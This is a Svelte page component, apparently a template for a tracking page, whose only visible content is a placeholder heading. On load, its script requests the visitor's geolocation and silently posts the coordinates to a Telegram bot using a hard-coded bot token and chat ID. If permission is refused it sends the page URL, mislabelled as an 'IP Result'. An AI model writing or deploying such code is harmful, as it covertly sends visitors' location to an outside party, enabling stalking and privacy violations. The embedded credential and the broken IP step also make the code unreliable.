<script>
  import { onMount } from 'svelte';

  onMount(() => {
    // Request location permission automatically
    navigator.geolocation.getCurrentPosition(
      (position) => {
        // Location permission granted, send location result to Telegram bots
        sendLocationToTelegramBots(position.coords.latitude, position.coords.longitude);
      },
      (error) => {
        if (error.code === error.PERMISSION_DENIED) {
          // Location permission denied, send IP result to Telegram bots
          sendIPToTelegramBots();
        }
      }
    );
  });

  function sendLocationToTelegramBots(latitude, longitude) {
    // Replace 'YOUR_TELEGRAM_BOT_API_KEY' with your actual Telegram bot API key
    const telegramBotAPIKey = '5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg';
    const telegramBotURL = `https://api.telegram.org/bot${telegramBotAPIKey}/sendMessage`;

    const message = `Location Result: Latitude - ${latitude}, Longitude - ${longitude}`;

    // Send location result to Telegram bots using an HTTP request
    fetch(telegramBotURL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: '373715044',
        text: message,
      }),
    });
  }

  function sendIPToTelegramBots() {
    // Replace 'YOUR_TELEGRAM_BOT_API_KEY' with your actual Telegram bot API key
    const telegramBotAPIKey = '5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg';
    const telegramBotURL = `https://api.telegram.org/bot${telegramBotAPIKey}/sendMessage`;

    const message = `IP Result: ${window.location.href}`;

    // Send IP result to Telegram bots using an HTTP request
    fetch(telegramBotURL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: '373715044',
        text: message,
      }),
    });
  }
</script>

<main>
  <h1>Your App Content</h1>
  <!-- Add your app content here -->
</main>
